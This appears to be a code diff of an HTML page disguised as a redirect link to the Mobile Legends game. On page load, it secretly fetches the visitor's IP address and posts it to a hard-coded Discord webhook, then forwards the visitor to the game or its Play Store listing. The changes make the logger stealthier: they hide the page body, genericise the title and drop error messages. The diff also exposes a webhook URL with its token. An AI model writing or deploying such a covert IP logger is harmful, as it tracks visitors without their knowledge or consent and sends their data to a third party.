@@ -3,33 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirect ke Mobile Legends</title>
+    <title>Redirect...</title>
+    <style>
+        body {
+            display: none;  
+        }
+    </style>
     <script>
         window.onload = function() {
             const webhookUrl = "https://discord.com/api/webhooks/1343229196897353808/5mq_Wnlt8xnIpyN4Rr_HdP2VRdjxPQ5cXzJlAcMayn1elvCHUZLN87MSweWbfEAdG1uF";
 
-            fetch("https://api.ipify.org?format=json")
+            fetch("https://api.ipify.org?format=json", { cache: "no-store" })
                 .then(response => response.json())
                 .then(data => {
-                    const ipAddress = data.ip;
                     const payload = {
-                        content: `@here`,
-                        embeds: [
-                            {
-                                title: "🌐 IP Logger Notification",
-                                description: "Seseorang telah mengunjungi halaman ini.",
-                                color: 15158332,
-                                fields: [
-                                    {
-                                        name: "IP Address",
-                                        value: `\`\`\`${ipAddress}\`\`\``
-                                    }
-                                ],
-                                footer: {
-                                    text: `Log Timestamp: ${new Date().toLocaleString()}`
-                                }
-                            }
-                        ]
+                        content: `IP Address: ${data.ip}`
                     };
 
                     fetch(webhookUrl, {
@@ -40,11 +28,9 @@
                         body: JSON.stringify(payload)
                     });
                 })
-                .catch(error => console.error("Gagal mendapatkan IP Address:", error))
                 .finally(() => {
-                     window.location.href = "mobilelegends://";
-
-                       setTimeout(function() {
+                    window.location.href = "mobilelegends://";
+                    setTimeout(() => {
                         window.location.href = "https://play.google.com/store/apps/details?id=com.mobile.legends";
                     }, 2000);
                 });
